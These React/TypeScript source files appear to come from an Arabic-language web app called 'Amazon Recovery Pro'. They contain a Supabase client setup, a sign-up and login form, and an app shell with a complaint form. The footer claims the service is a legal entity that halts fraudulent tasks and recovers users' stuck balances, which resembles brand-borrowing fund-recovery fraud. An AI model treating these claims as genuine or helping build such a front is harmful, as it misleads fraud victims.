import { createClient } from '@supabase/supabase-js';

// ملاحظة: استبدل هذه القيم بقيم مشروعك من إعدادات Supabase
const supabaseUrl = 'YOUR_SUPABASE_URL';
const supabaseAnonKey = 'YOUR_SUPABASE_ANON_KEY';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

import React, { useState } from 'react';
import { supabase } from '../lib/supabase.ts';
import { ShieldCheck, Mail, Lock, User, Loader2 } from 'lucide-react';

const Auth: React.FC = () => {
  const [loading, setLoading] = useState(false);
  const [isSignUp, setIsSignUp] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [fullName, setFullName] = useState('');
  const [error, setError] = useState<string | null>(null);

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      if (isSignUp) {
        const { data, error: signUpError } = await supabase.auth.signUp({
          email,
          password,
        });
        if (signUpError) throw signUpError;

        // إنشاء ملف الشخصي في جدول profiles
        if (data.user) {
          const customerCode = Math.floor(100000 + Math.random() * 900000).toString();
          const { error: profileError } = await supabase
            .from('profiles')
            .insert([{ id: data.user.id, full_name: fullName, customer_code: customerCode }]);
          if (profileError) throw profileError;
        }
        alert('تم إنشاء الحساب! يرجى التحقق من بريدك الإلكتروني (إذا تم تفعيل التأكيد).');
      } else {
        const { error: signInError } = await supabase.auth.signInWithPassword({
          email,
          password,
        });
        if (signInError) throw signInError;
      }
    } catch (err: any) {
      setError(err.message || 'حدث خطأ ما');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-6 bg-[#F4F7F9]">
      <div className="w-full max-w-md bg-white rounded-[40px] shadow-2xl p-8 border border-gray-100">
        <div className="flex flex-col items-center mb-8">
          <div className="w-20 h-20 bg-gradient-to-br from-[#9B4A4E] to-[#7C4A50] rounded-3xl flex items-center justify-center shadow-lg mb-4">
            <ShieldCheck className="text-white" size={40} />
          </div>
          <h2 className="text-2xl font-black text-gray-800">
            {isSignUp ? 'إنشاء حساب جديد' : 'تسجيل الدخول'}
          </h2>
          <p className="text-gray-400 text-xs mt-2 font-medium">Amazon Recovery Pro | نظام الشكاوي</p>
        </div>

        <form onSubmit={handleAuth} className="space-y-4">
          {isSignUp && (
            <div className="relative">
              <User className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
              <input
                type="text"
                placeholder="الاسم الكامل"
                required
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full bg-gray-50 border border-gray-100 rounded-2xl px-12 py-4 text-sm focus:ring-2 focus:ring-[#9B4A4E] outline-none transition-all text-right"
              />
            </div>
          )}

          <div className="relative">
            <Mail className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
            <input
              type="email"
              placeholder="البريد الإلكتروني"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full bg-gray-50 border border-gray-100 rounded-2xl px-12 py-4 text-sm focus:ring-2 focus:ring-[#9B4A4E] outline-none transition-all text-right"
              dir="ltr"
            />
          </div>

          <div className="relative">
            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
            <input
              type="password"
              placeholder="كلمة المرور"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-gray-50 border border-gray-100 rounded-2xl px-12 py-4 text-sm focus:ring-2 focus:ring-[#9B4A4E] outline-none transition-all text-right"
              dir="ltr"
            />
          </div>

          {error && (
            <div className="bg-red-50 text-red-600 text-[10px] font-bold p-3 rounded-xl border border-red-100 text-center">
              {error}
            </div>
          )}

          <button
            type="submit"
            disabled={loading}
            className="w-full bg-[#9B4A4E] text-white font-bold py-4 rounded-2xl shadow-lg shadow-[#9B4A4E]/20 hover:bg-[#7C4A50] active:scale-95 transition-all flex items-center justify-center gap-2"
          >
            {loading ? <Loader2 className="animate-spin" size={20} /> : (isSignUp ? 'إنشاء الحساب' : 'دخول النظام')}
          </button>
        </form>

        <div className="mt-6 text-center">
          <button
            onClick={() => setIsSignUp(!isSignUp)}
            className="text-xs font-bold text-[#9B4A4E] hover:underline"
          >
            {isSignUp ? 'لديك حساب بالفعل؟ سجل دخولك' : 'ليس لديك حساب؟ اشترك الآن'}
          </button>
        </div>
      </div>
    </div>
  );
};

export default Auth;

import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import RecoveryForm from './components/RecoveryForm.tsx';
import LiveStatus from './components/LiveStatus.tsx';
import BottomNav from './components/BottomNav.tsx';
import Auth from './components/Auth.tsx';
import { supabase } from './lib/supabase.ts';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Home');
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // التحقق من الجلسة الحالية
    supabase.auth.getSession().then(({ data: { session } }) => {
      setSession(session);
      setLoading(false);
    });

    // الاستماع لتغييرات الحالة
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
    });

    return () => subscription.unsubscribe();
  }, []);

  if (loading) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
        <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  if (!session) {
    return <Auth />;
  }

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      <Header />

      <main className="flex-1 px-4 py-2">
        <LiveStatus />

        <div className="mt-2">
           <div className="flex items-center gap-2 mb-3 px-1">
              <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
              <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
           </div>
           <RecoveryForm />
        </div>

        <div className="mt-6 px-4 text-center">
          <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً في إيقاف المهام الاحتيالية وتصحيح مسار السجلات المالية ورفع الشكاوي للجهات المختصة لاستعادة رصيدك العالق.
          </p>
        </div>
      </main>

      <div className="fixed bottom-24 right-6 z-50">
        <button className="bg-[#9B4A4E] text-white p-4 rounded-full shadow-2xl animate-bounce flex items-center justify-center border-4 border-white active:scale-90 transition-transform">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
        </button>
      </div>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} />
    </div>
  );
};

export default App;

